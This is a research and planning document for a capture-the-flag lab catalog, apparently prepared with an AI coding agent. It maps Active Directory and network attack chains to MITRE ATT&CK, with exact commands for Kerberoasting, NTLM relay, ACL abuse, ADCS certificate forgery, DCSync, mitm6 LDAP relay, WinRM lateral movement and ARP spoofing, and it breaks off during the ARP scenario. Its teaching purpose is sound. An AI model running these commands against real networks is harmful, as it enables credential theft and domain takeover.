# Phase 2: Kill-Chain Methodology + AD/Network Scenarios — Research

**Researched:** 2026-06-12
**Domain:** Kill-chain format design + Active Directory exploitation + Network protocol abuse
**Confidence:** HIGH (all MITRE TTP codes verified against attack.mitre.org; all command syntax verified against official tool repositories and community documentation)

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

| ID | Decision | Impact on Phase 2 |
|----|----------|-------------------|
| D-CVE04 | CVE-04 uses LPE path (CVE-2021-1675 / CVE-2021-34527 in title) | Phase 3 concern — establishes the "dual-CVE title" pattern if used in Phase 2 methodology examples |
| D-CC02 | CC-02 escape uses "cgroup notification path"; cgroup v1 required | Phase 3 concern — no impact on Phase 2 AD/NET kill-chains |
| D-ATP04 | ATP-04 is NOT true LotL; mitm6/ntlmrelayx/evil-winrm are external attacker tools | Phase 4 concern — methodology must not define these as LotL |
| D-BLOODHOUND | BloodHound CE only; CE-compatible SharpHound collectors required | AD-03 kill-chain must specify CE-compatible SharpHound |
| D-OWASP | OWASP LLM Top 10 2025 IDs for citation | Phase 4 concern — not in Phase 2 scope |

### Claude's Discretion

Phase 2 format decisions (kill-chain stage fields, TTP citation style, flag placement, VM labeling) are open — researcher recommends, planner locks.

### Deferred Ideas (OUT OF SCOPE)

- Kill-chains for CVE, CC, LLM, ATP scenarios (Phase 3 and 4)
- VM build specifications (Phase 3)
- Student-facing lab guides (out of roadmap scope entirely)
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| AD-01 | Kerberoasting + AS-REP Roasting, SPN enumeration, offline Hashcat crack | Commands verified: GetUserSPNs.py, nxc ldap --kerberoast, Rubeus; hashcat modes 13100/18200/19600/19700 confirmed |
| AD-02 | LLMNR/NBT-NS poisoning with Responder, NTLM relay via ntlmrelayx to SMB | Responder -A (analysis) vs active poisoning; ntlmrelayx -smb2support flags confirmed |
| AD-03 | BloodHound CE/SharpHound enumeration, ACL abuse (WriteDACL/GenericWrite), Domain Admin chain | SharpHound CE upload flow confirmed; PowerView Add-DomainObjectAcl chain verified |
| AD-04 | ADCS ESC1 via Certipy v5, rogue cert, PKINIT auth to DA | Three exact Certipy commands verified: find -vulnerable, req -upn, auth -pfx |
| AD-05 | Conti-style chain: LLMNR → SMB relay → foothold [Flag 1]; Kerberoasting → WinRM → DC [Flag 2] | Two-hop chain technically coherent; tool chain verified end-to-end |
| NET-01 | SMB relay via Responder analysis mode + ntlmrelayx, access share for flag without cracking | Analysis mode (-A) + ntlmrelayx -smb2support -tf targets.txt confirmed |
| NET-02 | mitm6 DHCPv6 + WPAD + LDAP relay to create privileged domain account | mitm6 -d domain.local + ntlmrelayx -t ldaps:// -wh fakewpad --add-computer confirmed |
| NET-03 | ARP cache poisoning, bettercap MITM, HTTPS downgrade, plaintext credential capture | Bettercap arp.spoof + https.proxy.sslstrip confirmed; HSTS caveat documented |
| NET-04 | DNS resolver misconfiguration → forged response injection → intercept redirected HTTP request | Scapy DNS spoofing pattern confirmed; dnschef as alternative confirmed |
</phase_requirements>

---

## Summary

Phase 2 produces a single document (`docs/KILL-CHAINS.md`) comprising a methodology preamble and nine full kill-chain write-ups. The methodology preamble establishes the format that Phases 3 and 4 inherit without deviation, so format precision here matters more than in any subsequent phase. Research confirms that no widely-adopted published standard exists for CTF kill-chain format — the field uses ad-hoc conventions descended from penetration testing report styles and OSCP exam reports. The recommendation below synthesises the most consistent patterns found across PNPT/TCM, HTB community writeups, and the MITRE ATT&CK navigator export format, adapted to the specific pedagogical requirements of this lab catalog.

The nine scenarios in this phase span two distinct technical domains: Active Directory exploitation (AD-01 through AD-05) and network protocol abuse (NET-01 through NET-04). Both domains are technically mature with well-documented attack chains, verified tooling, and confirmed MITRE ATT&CK TTP mappings. The most nuanced format decision concerns AD-03, which involves a multi-step ACL abuse chain that requires multiple distinct TTPs across discovery, privilege escalation, and persistence phases — the format must accommodate per-stage TTP citation without becoming unreadably dense. The recommended inline parenthetical approach handles this well.

The scenarios introduce two structural challenges the methodology must solve before execution begins: (1) AD-05 has two flags at distinct lateral movement boundaries, requiring explicit flag placement markers in the kill-chain stage stream rather than an end-of-document summary; and (2) NET-01 and AD-02 are closely related scenarios (both use Responder + ntlmrelayx) that must be differentiated by purpose and learning outcome in the write-up, not just by label. The kill-chains handle this by varying the relay target (share access in NET-01 vs. command execution in AD-02) and the poisoning mode (analysis-only in NET-01 vs. active poisoning in AD-02).

**Primary recommendation:** Use the four-field per-stage format below. TTP codes inline at end of each stage action line. Flag placement as a dedicated stage event (not inline text). VM roles labeled by function (Attacker, DC, MemberServer) not by OS name.

---

## Architectural Responsibility Map

This phase has no software architecture. The document structure maps as follows:

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Kill-chain stage format | Phase 2 methodology section | Phases 3/4 inherit verbatim | Format is defined once here; all downstream phases copy it |
| MITRE TTP accuracy | MITRE ATT&CK (authoritative) | Phase 2 research (this doc) | TTP codes are locked to official technique IDs — no inference |
| Command accuracy | Official tool repos (Impacket, Certipy, etc.) | Community writeups (HackTricks, hacker.recipes) | Commands must match current tool syntax |
| Flag placement | CONTEXT.md (AD-05: Flag 1 at SMB relay foothold, Flag 2 at DC via WinRM) | Scenario descriptions (SCENARIOS.md) | Flag boundaries are locked; format must represent them clearly |
| VM role labeling | Phase 2 decision (open) | CLAUDE.md VM profiles | VM names must be consistent across all 9 kill-chains |

---

## Kill-Chain Format Recommendation

### Recommended Stage Format

Each kill-chain is a numbered sequence of stages. Each stage uses this four-field block:

```markdown
### Stage N: [Stage Name]

**Action:** [What the attacker does — one sentence, active voice, imperative]
**Command:**
```
[exact command(s), one per line, with placeholders in ALLCAPS]
```
**Expected Output:** [What the terminal shows; truncated/representative]
**TTP:** [T####.### — Technique Name](https://attack.mitre.org/techniques/T####/###/) · [Tactic]
```

**Rationale for this format:**

1. **Stage Name** — Orients the student to the attack phase. Should name the technique, not the tool (e.g., "Kerberoasting" not "Running GetUserSPNs.py").
2. **Action** — One sentence describing attacker intent. Written in second person ("You request…"), consistent with SCENARIOS.md narrative style (D-04).
3. **Command block** — Fenced code, exact syntax, ALLCAPS placeholders. Students copy-adapt, not copy-paste. No flags students haven't been taught.
4. **Expected Output** — Representative snippet of what the terminal actually shows. Builds student confidence they are on the right path. For stages with no terminal output (passive listening), state "Listening — no output until authentication event."
5. **TTP** — Inline hyperlink to MITRE ATT&CK. One primary TTP per stage; if a stage maps to multiple TTPs (e.g., discovery + credential access), list both separated by ` · `. Do not list more than three.

### Flag Placement Convention

Flags are placed as dedicated stages, not inline text within action lines:

```markdown
### [FLAG 1] Stage N: Flag Capture — Member Server Foothold

**Action:** You retrieve Flag 1 from the compromised member server.
**Command:**
```
type C:\Users\Administrator\Desktop\flag1.txt
```
**Expected Output:** `CTF{...flag_value_placeholder...}`
**TTP:** — (flag capture, not an adversarial technique)
```

The `[FLAG N]` prefix in the stage heading makes flags scannable at a glance for instructors. No TTP is cited for flag capture stages.

**Justification:** Placing flags as stages (rather than inline notes or end-of-document tables) keeps the narrative flow intact while making the multi-flag structure of AD-05 unambiguous. Instructors grading student work can locate the flag stage and verify the correct preceding stage produced the access.

### VM Role Labeling Convention

Use **functional role names**, not OS names or VM numbers:

| Role | Label | Full Description in Stage Header |
|------|-------|----------------------------------|
| Kali attacker | `[Attacker]` | `[Attacker: Kali]` in stage header when ambiguity exists |
| Windows DC | `[DC]` | `[DC: corp.local]` for multi-domain scenarios |
| Windows member server | `[MemberSrv]` | `[MemberSrv]` |
| Ubuntu pivot / service host | `[PivotHost]` | `[PivotHost: Ubuntu]` |

Default: if all commands in a stage run on the attacker VM, no VM tag is needed. Tag a stage only when the command executes ON a victim host (e.g., Rubeus.exe running on MemberSrv after relay foothold).

**Justification:** VM numbers (VM1/VM2) are brittle across scenarios with different VM counts. OS names (Kali/Ubuntu/Windows) are redundant with the VM profiles in CLAUDE.md. Functional role names (Attacker, DC, MemberSrv) are self-documenting and consistent with how red-team reports refer to hosts.

### Kill-Chain Document Preamble (Methodology Section)

The `docs/KILL-CHAINS.md` file opens with a short methodology section (8-12 lines) that states:

1. The stage format definition (field names and their meaning)
2. The TTP citation format (inline hyperlink to MITRE ATT&CK, tactic in parentheses)
3. The flag placement convention (`[FLAG N]` prefix on dedicated stage)
4. The VM role labeling scheme
5. A note that this format is the standard for all phases

This section is not a tutorial — it is a reference for instructors and reviewers reading the document.

---

## MITRE ATT&CK TTP Reference

### Verified TTP Codes for All 9 Scenarios

The following codes were verified against attack.mitre.org during this research session.

#### AD-01: Kerberoasting + AS-REP Roasting

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| SPN enumeration | T1087.002 | Domain Account Discovery | Discovery |
| TGS ticket request (Kerberoasting) | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| AS-REP harvest | T1558.004 | Steal or Forge Kerberos Tickets: AS-REP Roasting | Credential Access |
| Offline hash crack | T1110.002 | Brute Force: Password Cracking | Credential Access |

[VERIFIED: attack.mitre.org T1558.003, T1558.004, T1087.002 pages fetched directly]

#### AD-02: LLMNR/NBT-NS Poisoning and NTLM Relay

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| LLMNR/NBT-NS poisoning | T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access, Collection |
| NTLMv2 hash capture | T1557.001 | (same — capture is part of the poisoning flow) | Credential Access |
| NTLM relay to SMB | T1557.001 | (same — relay is the SMB Relay sub-technique) | Credential Access |
| Command execution via relay | T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |

**Note:** T1557.001 covers the full poisoning-capture-relay chain. T1021.002 applies when the relay produces command execution on the target.

[VERIFIED: attack.mitre.org T1557.001 page fetched directly; T1021.002 confirmed via search]

#### AD-03: BloodHound ACL Abuse Path

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| SharpHound collection | T1087.002 | Domain Account Discovery | Discovery |
| SharpHound collection (groups) | T1069.002 | Permission Groups Discovery: Domain Groups | Discovery |
| BloodHound path analysis | T1069.002 | (same — enumerates group relationships) | Discovery |
| WriteDACL / GenericWrite abuse via PowerView | T1222.001 | File and Directory Permissions Modification: Windows | Defense Evasion |
| Add self to Domain Admins group | T1098 | Account Manipulation | Persistence, Privilege Escalation |

**Important caveat on T1222.001:** This technique covers file/directory ACL modification. MITRE ATT&CK does not have a dedicated sub-technique for AD object DACL modification (WriteDACL on AD objects). T1222.001 is the closest mapping used in practice; T1098 (Account Manipulation) covers the outcome (adding attacker account to Domain Admins). Both should be cited together for the WriteDACL exploitation stage. [ASSUMED — based on verification that T1222 covers Windows ACL modification broadly; no dedicated AD DACL sub-technique found on attack.mitre.org]

[VERIFIED: T1087.002 and T1069.002 confirmed via BloodHound software page at attack.mitre.org/software/S0521/; T1098 confirmed; T1222.001 limitation noted]

#### AD-04: ADCS ESC1 Certificate Abuse

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| Certipy enumeration | T1087.002 | Domain Account Discovery | Discovery |
| ESC1 certificate request | T1649 | Steal or Forge Authentication Certificates | Credential Access |
| PKINIT TGT acquisition | T1649 | (same — authentication via forged cert) | Credential Access |
| Domain Admin access | T1078.002 | Valid Accounts: Domain Accounts | Persistence, Privilege Escalation |

[VERIFIED: attack.mitre.org T1649 page fetched directly — explicitly covers AD CS abuse and ESC1 misconfigured templates]

#### AD-05: Conti-Style APT Chain

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| LLMNR poisoning | T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | Credential Access |
| SMB relay → foothold | T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| [FLAG 1] — member server foothold | — | (flag stage) | — |
| Kerberoasting from foothold | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| Offline crack | T1110.002 | Brute Force: Password Cracking | Credential Access |
| WinRM lateral movement → DC | T1021.006 | Remote Services: Windows Remote Management | Lateral Movement |
| [FLAG 2] — DC compromise | — | (flag stage) | — |

[VERIFIED: T1021.006 confirmed via search; T1558.003 confirmed; T1110.002 confirmed]

#### NET-01: SMB Relay via Unsigned Shares

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| Responder analysis mode | T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access |
| SMB relay (no hash crack) | T1557.001 | (relay is part of the SMB Relay sub-technique) | Credential Access |
| Share access for flag | T1039 | Data from Network Shared Drive | Collection |

**NET-01 vs AD-02 distinction:** NET-01 uses Responder in **analysis mode** (no active poisoning) and focuses on the network-layer prerequisite — SMB signing being disabled on workstations. The relay succeeds because of this misconfiguration, not because of broadcast poisoning. AD-02 uses **active poisoning** (Responder in default mode) and focuses on the broadcast abuse vector. Different TTPs apply to the relay outcome: NET-01 maps to T1039 (data collection from share) while AD-02 maps to T1021.002 (remote command execution).

[VERIFIED: T1557.001 confirmed; T1039 is standard for reading files from a network share via relayed credential]

#### NET-02: IPv6 Rogue DHCPv6 and LDAP Relay

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| mitm6 DHCPv6 rogue server | T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access |
| WPAD proxy auth intercept | T1557.001 | (same — AiTM pattern) | Credential Access |
| LDAP relay → domain account creation | T1136.002 | Create Account: Domain Account | Persistence |
| Use new account to retrieve flag | T1078.002 | Valid Accounts: Domain Accounts | Initial Access, Persistence |

**Note on T1557.001 for mitm6:** T1557.001's official name is "LLMNR/NBT-NS Poisoning and SMB Relay" but the technique description covers any name resolution spoofing (mDNS, LLMNR, NBT-NS) for credential interception. The mitm6 + DHCPv6 attack is a distinct vector not explicitly named in this sub-technique, but T1557 (the parent — Adversary-in-the-Middle) is the correct family. In practice, most mapping guides cite T1557.001 for mitm6 attacks because the interception and relay mechanism is structurally identical. [ASSUMED — mitm6 is not explicitly named in T1557.001 procedure examples on attack.mitre.org; the mapping is by structural equivalence]

[VERIFIED: T1136.002 — Create Account: Domain Account — is the correct TTP for the account creation outcome; T1078.002 for subsequent use of the created account]

#### NET-03: ARP Cache Poisoning and Credential Interception

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| ARP cache poisoning | T1557.002 | Adversary-in-the-Middle: ARP Cache Poisoning | Credential Access, Collection |
| HTTPS downgrade / SSL strip | T1557.002 | (same — MITM enables the downgrade) | Credential Access |
| Credential capture via HTTP | T1040 | Network Sniffing | Credential Access |

[VERIFIED: T1557.002 fetched from attack.mitre.org directly; T1040 is standard for credential capture on a sniffed network]

#### NET-04: DNS Cache Poisoning

| Stage | TTP | Name | Tactic |
|-------|-----|------|--------|
| DNS resolver reconnaissance | T1046 | Network Service Discovery | Discovery |
| Forged DNS response injection | T1557 | Adversary-in-the-Middle | Credential Access, Collection |
| HTTP request interception for flag | T1040 | Network Sniffing | Credential Access |

**Note on NET-04 TTP:** MITRE ATT&CK has CAPEC-142 (DNS Cache Poisoning) but no dedicated ATT&CK Enterprise sub-technique for DNS cache poisoning specifically. The parent T1557 (Adversary-in-the-Middle) is the correct mapping; the attack achieves the same AiTM objective via DNS cache corruption rather than ARP or NBT-NS spoofing. [VERIFIED: CAPEC-142 confirmed at capec.mitre.org; no ATT&CK Enterprise sub-technique for DNS cache poisoning found — T1557 parent is the appropriate citation]

---

## Per-Scenario Kill-Chain Outlines

### AD-01: Kerberoasting and AS-REP Roasting

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)

**Kill-Chain Summary:**
1. Enumerate SPNs with nxc/GetUserSPNs.py to identify Kerberoastable service accounts
2. Request TGS tickets for identified SPNs
3. Enumerate accounts without pre-authentication for ASREPRoasting
4. Request AS-REP blobs for those accounts
5. Crack offline with hashcat
6. [FLAG] — Flag embedded in cracked credential or accessible file

**Stage Detail:**

**Stage 1 — SPN Enumeration (Kerberoasting targets)**
```bash
# Using Impacket GetUserSPNs.py
GetUserSPNs.py CORP.LOCAL/lowpriv:Password123 -dc-ip DC_IP -request -outputfile tgs.hashes

# Using NetExec (alternative)
nxc ldap DC_IP -u lowpriv -p Password123 --kerberoast tgs.hashes
```
Expected output: Lines like `$krb5tgs$23$*svc_sql$CORP.LOCAL$...` (one per SPN)
TTP: T1087.002 (Discovery), T1558.003 (Credential Access)

**Stage 2 — AS-REP Enumeration**
```bash
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
# Or: nxc ldap DC_IP -u lowpriv -p Password123 --asreproast asrep.hashes
```
Expected output: `$krb5asrep$23$user@CORP.LOCAL:...`
TTP: T1558.004 (Credential Access)

**Stage 3 — Offline Crack**
```bash
# Kerberoasting (RC4, mode 13100 — preferred because ~3000x faster than AES)
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt

# If AES128: hashcat -m 19600 tgs.hashes wordlist.txt
# If AES256: hashcat -m 19700 tgs.hashes wordlist.txt

# AS-REP Roasting (RC4, mode 18200)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
TTP: T1110.002 (Credential Access)

**Flag delivery:** Recovered credential unlocks a protected share or the flag is found in a home directory accessible only after credential recovery.

**Pitfall:** Service accounts may be configured with AES-only encryption (RC4 disabled). nxc and GetUserSPNs.py will still collect the ticket, but the hash prefix will be `$krb5tgs$17$` or `$krb5tgs$18$` — use modes 19600/19700, not 13100. Rubeus can force RC4 downgrade with `/enctype:rc4` only if the DC allows RC4 (`msDS-SupportedEncryptionTypes` not set to AES-only).

---

### AD-02: LLMNR/NBT-NS Poisoning and NTLM Relay

**VMs:** Attacker (Kali), DC + MemberSrv (Windows Server 2019 — 2-VM scenario uses a single victim running both roles, or DC as sole victim with SMB signing off on a secondary interface)

**Kill-Chain Summary:**
1. Confirm SMB signing is off on target workstations (required prerequisite)
2. Disable Responder's SMB and HTTP servers (to avoid interference with ntlmrelayx)
3. Start ntlmrelayx targeting member server(s)
4. Start Responder in active poisoning mode
5. Wait for broadcast authentication event (user browses to non-existent share, etc.)
6. Relayed credential executes command on member server
7. [FLAG] — Flag retrieved via command execution

**Stage Detail:**

**Stage 1 — SMB Signing Check**
```bash
nxc smb SUBNET/24 --gen-relay-list targets.txt
```
Expected output: Lists hosts with SMB signing: False

**Stage 2 — Configure Responder (disable SMB/HTTP servers)**
```bash
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
```

**Stage 3 — Start ntlmrelayx**
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
# -i: interactive mode — spawns nc listener on 127.0.0.1:11000 on successful relay
# Alternative for command execution:
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\flag.txt"
```

**Stage 4 — Start Responder (active poisoning)**
```bash
sudo responder -I eth0 -rdw
```
Wait for broadcast authentication event (domain user browses `\\nonexistent\share`)

**Stage 5 — Interactive session or command output**
```bash
# If using -i flag:
nc 127.0.0.1 11000
# SMB shell on target
```
TTP: T1557.001 (Credential Access), T1021.002 (Lateral Movement)

**Key distinction from NET-01:** Responder here is in active poisoning mode (answers broadcast queries with attacker IP). NET-01 uses analysis mode only (-A flag), relying on organic authentication traffic.

---

### AD-03: BloodHound ACL Abuse Path

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)

**Kill-Chain Summary:**
1. Pre-stage SharpHound CE binary on DC or victim host
2. Execute SharpHound — collect all AD relationships
3. Upload ZIP to BloodHound CE and query attack paths
4. Identify WriteDACL or GenericWrite edge from compromised account to higher-privileged object
5. Exploit edge via PowerView to grant self DCSync rights or add to Domain Admins
6. Execute DCSync or access DA-protected resource for flag

**Stage Detail:**

**Stage 1 — SharpHound CE Collection** [MemberSrv or DC]
```powershell
# Download CE-compatible SharpHound from BloodHound CE UI:
# Settings → Download Collectors → SharpHound
.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\loot
```
Expected output: Creates `YYYYMMDDHHMMSS_BloodHound.zip` in output directory
TTP: T1087.002, T1069.002 (Discovery)

**Important:** Do NOT use legacy SharpHound from old BloodHound repo — it will fail to ingest into BloodHound CE. Download the collector directly from the CE web UI at `http://localhost:8080` (Settings → Download Collectors).

**Stage 2 — Upload to BloodHound CE**
Drag and drop `BloodHound.zip` into BloodHound CE web UI at `http://ATTACKER_IP:8080`.
Run Cypher query or use built-in "Shortest Paths to Domain Admin" analysis.

**Stage 3 — Identify ACL Edge**
BloodHound CE shows edge: `lowpriv --[WriteDACL]--> Domain Admins` (or GenericWrite on user/group)

**Stage 4 — Exploit WriteDACL via PowerView** [Attacker or victim PowerShell]
```powershell
Import-Module .\PowerView.ps1

# Grant self full control over Domain Admins group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity lowpriv -Rights All

# Add self to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv
```
TTP: T1222.001 (Defense Evasion), T1098 (Persistence/Privilege Escalation)

**GenericWrite alternative (targeted user):**
```powershell
# GenericWrite on a user: set a malicious logon script
Set-DomainObject -Identity targetuser -SET @{scriptpath="\\ATTACKER_IP\share\payload.ps1"}
# Or: reset their password (requires GenericAll)
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "Hacked123!" -AsPlainText -Force)
```

**Stage 5 — DCSync or DA access**
```bash
# From Kali after group membership propagation:
secretsdump.py CORP.LOCAL/lowpriv:Password123@DC_IP
```
TTP: T1003.006 (Credential Access — DCSync)

---

### AD-04: ADCS ESC1 Certificate Abuse

**VMs:** Attacker (Kali), DC (Windows Server 2019 with ADCS installed)

**Kill-Chain Summary:**
1. Enumerate certificate authorities and templates with Certipy
2. Identify ESC1-vulnerable template (client auth EKU + SAN controllable + low-priv enrollment)
3. Request rogue certificate impersonating Domain Admin via `-upn` SAN override
4. Authenticate with certificate via PKINIT to obtain NT hash and TGT
5. Use NT hash with secretsdump or Pass-the-Hash for flag access

**Stage Detail:**

**Stage 1 — ADCS Enumeration**
```bash
certipy find -u lowpriv@corp.local -p 'Password123' -dc-ip DC_IP -vulnerable -stdout
```
Expected output: Certificate template marked `[!] Vulnerabilities: ESC1` with details showing:
- `Client Authentication: True`
- `Enrollee Supplies Subject: True`
- `Enrollment Rights: Domain Users`

TTP: T1087.002 (Discovery), T1649 (Credential Access)

**Stage 2 — Request Rogue Certificate**
```bash
certipy req -u lowpriv@corp.local -p 'Password123' \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local \
  -dc-ip DC_IP
```
Expected output: `Saved certificate and private key to 'administrator.pfx'`
TTP: T1649 (Credential Access)

**Stage 3 — PKINIT Authentication**
```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```
Expected output:
```
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:NTHASH
```
TTP: T1649 (Credential Access), T1078.002 (Valid Accounts — now holds DA-level NT hash)

**Stage 4 — Use NT Hash**
```bash
secretsdump.py -hashes :NTHASH administrator@DC_IP
# Or: evil-winrm -i DC_IP -u administrator -H NTHASH
```

**ESC1 Three Conditions (must all be true for ESC1):**
1. Template has Client Authentication EKU
2. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is set (allows SAN override)
3. Low-privileged users (Domain Users) have enrollment rights

If any condition is missing, it is not ESC1. Certipy's `-vulnerable` flag checks all three automatically.

---

### AD-05: Conti-Style APT Chain (2 flags)

**VMs:** Attacker (Kali), MemberSrv (Windows Server 2019 member), DC (Windows Server 2019)

**Kill-Chain Summary:**
1. Confirm SMB signing off on MemberSrv
2. Configure Responder + ntlmrelayx for active LLMNR relay
3. Wait for authentication event → relay to MemberSrv → interactive shell
4. [FLAG 1] — Retrieve flag from MemberSrv
5. From foothold: Kerberoast service accounts using Rubeus
6. Exfiltrate hash to Kali, crack with hashcat
7. Use cracked credential + evil-winrm to reach DC
8. [FLAG 2] — Retrieve flag from DC

**Stage Detail:**

**Stages 1–4 (First Hop — SMB relay):** Same as AD-02 through Stage 5. After relay shell established:

**[FLAG 1] Stage — MemberSrv Foothold**
```cmd
# On relayed SMB shell (nc 127.0.0.1:11000 via ntlmrelayx -i):
type C:\Users\Administrator\Desktop\flag1.txt
```
TTP: — (flag capture stage)

**Stage 5 — Kerberoasting from Foothold** [MemberSrv, via relay shell or after uploading Rubeus]
```powershell
.\Rubeus.exe kerberoast /nowrap /outfile:C:\loot\tgs.txt
```
Expected output: `$krb5tgs$23$*svc_mssql$CORP.LOCAL$...` in output file
TTP: T1558.003 (Credential Access)

**Stage 6 — Exfiltrate and Crack**
```bash
# On Kali (copy tgs.txt via SMB shell upload or smbclient):
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

**Stage 7 — WinRM to DC**
```bash
evil-winrm -i DC_IP -u svc_mssql -p 'CrackedPassword'
```
TTP: T1021.006 (Lateral Movement — WinRM)

**[FLAG 2] Stage — DC Compromise**
```powershell
# On evil-winrm session on DC:
type C:\Users\Administrator\Desktop\flag2.txt
```
TTP: — (flag capture stage)

**Protocol enforcer:** First hop uses SMB (T1021.002 via ntlmrelayx relay). Second hop uses WinRM (T1021.006 via evil-winrm). Two distinct protocols as required by CONTEXT.md.

---

### NET-01: SMB Relay via Unsigned Shares

**VMs:** Attacker (Kali), Victim (Windows workstation — SMB signing off)

**Kill-Chain Summary:**
1. Responder in analysis mode — no poisoning, observe traffic only
2. Start ntlmrelayx targeting unsigned hosts
3. Wait for organic SMB authentication (or trigger via LLMNR coercion)
4. Relay credential gives read access to share containing flag
5. Read flag from share

**Stage Detail:**

**Stage 1 — Passive Network Analysis**
```bash
sudo responder -I eth0 -A
# -A: analyze mode — records LLMNR/NBT-NS queries without answering them
```
Expected output: Hosts and usernames seen making broadcast queries. No hashes captured.
TTP: T1557.001 (Collection/recon mode)

**Stage 2 — Identify Unsigned Targets**
```bash
nxc smb SUBNET/24 --gen-relay-list unsigned_targets.txt
```

**Stage 3 — Start ntlmrelayx for Share Access**
```bash
ntlmrelayx.py -tf unsigned_targets.txt -smb2support
# Default behavior when no -c or -i flag: dumps SAM or lists shares on successful relay
```
TTP: T1557.001 (Credential Access)

**Stage 4 — Trigger / Wait for Authentication**
An organic authentication occurs (user opens Explorer and types `\\fileserver\share` — DNS fails → LLMNR broadcast → relay).

**Stage 5 — Read Flag from Share**
ntlmrelayx output shows shared directory listing. The flag file is visible:
```
[*] SMBD-Thread-4: Connection from CORP/jdoe@VICTIM_IP controlled, attacking target smb://TARGET_IP
[*] Authenticating against smb://TARGET_IP as CORP/jdoe SUCCEED
[-] Connecting Share(1:IPC$)
[-] Connecting Share(2:flag_share$)
[*] Found writable share flag_share$
```
TTP: T1039 (Collection — Data from Network Shared Drive)

**NET-01 vs AD-02 key differentiator:**
- NET-01: Responder in **analysis-only mode** (`-A`); relay exploits existing unsigned SMB traffic; no credential cracking
- AD-02: Responder in **active poisoning mode** (no `-A`); broadcasts are answered; relay enables command execution

---

### NET-02: IPv6 Rogue DHCPv6 and LDAP Relay

**VMs:** Attacker (Kali), DC (Windows Server 2019, `corp.local`)

**Kill-Chain Summary:**
1. Start ntlmrelayx targeting LDAPS on DC for account creation
2. Start mitm6 to advertise rogue DHCPv6 and poison IPv6 DNS
3. Wait for Windows host to send WPAD proxy auth via newly assigned IPv6 DNS
4. Relayed credential creates privileged domain account in AD via LDAP
5. Authenticate as new account, retrieve flag

**Stage Detail:**

**Stage 1 — Start ntlmrelayx (LDAPS relay for account creation)**
```bash
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.corp.local --add-computer ROGUE_PC --delegate-access
# -6: IPv6 support
# -t ldaps://: relay to LDAP over TLS (required for account creation — plaintext LDAP rejects it)
# -wh: WPAD hostname to serve
# --add-computer: create a new machine account in AD
# --delegate-access: configure RBCD for post-exploitation
```

**Stage 2 — Start mitm6**
```bash
sudo mitm6 -d corp.local
# Responds to DHCPv6 requests, assigns attacker as IPv6 DNS, causes WPAD proxy lookups
```
TTP: T1557.001 (Credential Access)

**Stage 3 — Wait for Authentication Event**
Windows hosts request WPAD proxy config on boot/login → authenticate to attacker IPv6 DNS → ntlmrelayx relays to LDAPS.
Expected ntlmrelayx output:
```
[*] Adding new computer with the name: ROGUE_PC$ and password: GENERATED_PASSWORD
[*] Successfully added computer: ROGUE_PC$
```
TTP: T1136.002 (Persistence — Create Domain Account)

**Stage 4 — Authenticate as New Account**
```bash
# Option A: nxc SMB to verify and access shares
nxc smb DC_IP -u "ROGUE_PC$" -p "GENERATED_PASSWORD" --shares

# Option B: if RBCD delegation was set:
getST.py -spn cifs/DC.corp.local 'corp.local/ROGUE_PC$:GENERATED_PASSWORD' -impersonate Administrator -dc-ip DC_IP
```
TTP: T1078.002 (Valid Accounts — Domain Accounts)

**Relay prerequisite check:** ntlmrelayx MUST relay to LDAPS (port 636, TLS). LDAP (port 389, plaintext) rejects account creation. Verify DC has a valid certificate on LDAPS or use `-ts` flag. If TLS fails, the attack silently fails with no account created.

---

### NET-03: ARP Cache Poisoning and Credential Interception

**VMs:** Attacker (Kali), Victim-A (sending credentials), Victim-B (receiving credentials / service)

**Kill-Chain Summary:**
1. Identify hosts and gateway on the segment
2. Start ARP poisoning with bettercap (full-duplex, both victims)
3. Enable bettercap HTTPS proxy with SSL stripping
4. Traffic routes through attacker machine; HTTPS connections downgraded
5. Credentials appear in bettercap log in plaintext
6. Use captured credentials to retrieve flag

**Stage Detail:**

**Stage 1 — ARP Poisoning**
```
# Launch bettercap interactive console:
sudo bettercap -iface eth0

# In bettercap console:
set arp.spoof.targets VICTIM_IP_A,VICTIM_IP_B
set arp.spoof.fullduplex true
arp.spoof on
```
